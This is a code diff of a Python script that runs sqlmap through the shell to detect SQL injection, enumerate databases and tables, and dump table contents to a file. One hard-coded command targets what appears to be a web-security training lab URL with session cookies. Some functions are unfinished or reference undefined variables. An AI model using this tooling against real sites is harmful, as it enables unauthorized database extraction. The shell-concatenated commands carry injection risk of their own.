@@ -1,5 +1,4 @@
 import subprocess
-import query
 
 def scan_url_vulnerability(url):
 	query = "sqlmap -u "+ url +" --batch"
@@ -113,14 +112,28 @@ def scan_url_tables(url, tech, level, db):
 	for x in range(len(stdout)):
 		str_search = "Database: " + db
 		if stdout[x:(x+10+len(db))] == str_search:
-			tables.append(stdout[(x+36+len(db)):(x+43+len(db))])
+			quantity_tables = int(stdout[x+12+len(db)])
+			get_tb = 0
+			i = (x+12+len(db))
+			while(get_tb < quantity_tables):
+				if stdout[i] == "|":
+					for j in range((i+1), len(stdout), 1):
+						if stdout[j] == "|":
+							get_tb += 1
+							table = stdout[(i+1):(j-1)]
+							tables.append(table)
+							i += (len(table)+3)
+							break
+				else:
+					i+=1
 		if (stdout[x:(x+6)]) == "ending":
 			time_ending = stdout[(x+9):(x+17)]
 			# print("time ending = " + time_ending)
 
 	f = open("output.txt", "a")
-	for table in tables:
-		f.write("table:" + table)
+	for i in range(len(tables)):
+		print(tables[i].lstrip())
+		f.write("table:" +tables[i].lstrip())
 		f.write("\n")
 	f.close()
 
@@ -133,7 +146,6 @@ def scan_url_tables(url, tech, level, db):
 
 def scan_url_content(url, tech, level, db, table):
 	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " -T " + table + " --dump" +" --batch"
-
 
 	print(query)
 	print("scanning content")
@@ -149,17 +161,11 @@ def scan_url_content(url, tech, level, db, table):
 	f.close()
 
 
-
-
-
 def scan_query_vulnerability(query):
 	vuls = []
-	f = open("output.txt", "w")
-	f.write("query:" + query)
-	f.write("\n")
-	f.close()
 
-	
+	print(query)
+	print("scanning vulnerability")
 	process = subprocess.Popen([query], 
 						stdin=subprocess.PIPE,
 						stdout=subprocess.PIPE,
@@ -175,21 +181,23 @@ def scan_query_vulnerability(query):
 			f.write("\n")
 			f.close()
 			# print("time starting = " + time_starting)
-		if (stdout[x:(x+6)]) == "ending":
-			time_ending = stdout[(x+9):(x+17)]
-			f = open("output.txt", "a")
-			f.write("time_ending:" + time_ending)
-			f.write("\n")
-			f.close()
-			# print("time ending = " + time_ending)
+
 		if (stdout[x:(x+4)]) == "Type":
-			vul = stdout[x+6]
-			f = open("output.txt", "a")
-			f.write("vul:" + vul)
-			f.write("\n")
-			f.close()
-			vuls.append(stdout[x+6])
-	print("test")
+			if stdout[x+6] == "b":
+				vuls.append("B")
+			elif stdout[x+6] == "s":
+				vuls.append("S")
+			elif stdout[x+6] == "t":
+				vuls.append("T")
+			else:
+				vuls.append(stdout[x+6])
+	f = open("output.txt", "a")
+	for vul in vuls:
+		f.write("vul:" + vul)
+		f.write("\n")
+	f.close()
+		
+
 	return vuls	
 
 def scan_query_database(query):
@@ -238,20 +246,64 @@ def scan_query_database(query):
 					f.write("dbs:" + db)
 					f.write("\n")
 				f.close()		
-		if (stdout[x:(x+6)]) == "ending":
-			time_ending = stdout[(x+9):(x+17)]
-			f = open("output.txt", "a")
-			f.write("time_ending:" + time_ending)
-			f.write("\n")
-			f.close()
-			# print("time ending = " + time_ending)
+
 
 	return dbs
 
+def scan_query_tables(query):
+	query = query
+	tables = []
+
+	print(query)
+	print("scanning tables")
+
+
+	process = subprocess.Popen([query], 
+						stdin=subprocess.PIPE,
+						stdout=subprocess.PIPE,
+						stderr=subprocess.PIPE,
+						shell = True, text = True)
+	stdout,stderr = process.communicate()
+
+	for x in range(len(stdout)):
+		str_search = "Database: " + db
+		if stdout[x:(x+10+len(db))] == str_search:
+			quantity_tables = int(stdout[x+12+len(db)])
+			get_tb = 0
+			i = (x+12+len(db))
+			while(get_tb < quantity_tables):
+				if stdout[i] == "|":
+					for j in range((i+1), len(stdout), 1):
+						if stdout[j] == "|":
+							get_tb += 1
+							table = stdout[(i+1):(j-1)]
+							tables.append(table)
+							i += (len(table)+3)
+							break
+				else:
+					i+=1
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
+			# print("time ending = " + time_ending)	
+
+	f = open("output.txt", "a")
+	for i in range(len(tables)):
+		print(tables[i].lstrip())
+		f.write("table:" +tables[i].lstrip())
+		f.write("\n")
+	f.close()
+			
+	f = open("output.txt", "a")
+	f.write("time_ending:" + time_ending)
+	f.write("\n")
+	f.close()
+
+def scan_query_content():
+	print("scan content")
+				
 
 def main():
-	mode =1
-	tech = ["B", "E", "U", "S", "T", "Q"]
+	mode = 3
 	level = ["2", "3", "4", "5"]
 	if(mode == 1):
 		f = open("input.txt", "r")
@@ -274,10 +326,11 @@ def main():
 			scan_url_content(url, vuls[0],level[0], dbs[0], tables[0])
 
 	if(mode == 2):
-		print("scan with query")
+		query = 'sqlmap -u https://0a4900570425c01dc0470466006f00b2.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=29PMYUHjgNUKvmwI; session=3zGP0MQtrqEMxU10ZH7KPlM48JC9ZfZ0" --level 2 -technique=B --dbs --batch'
+		dbs = scan_query_database(query)
 	if(mode == 3):
 		db = "public"
-		get_url_table(db)
+		print("test")
 
 if __name__ == "__main__":
 	main()
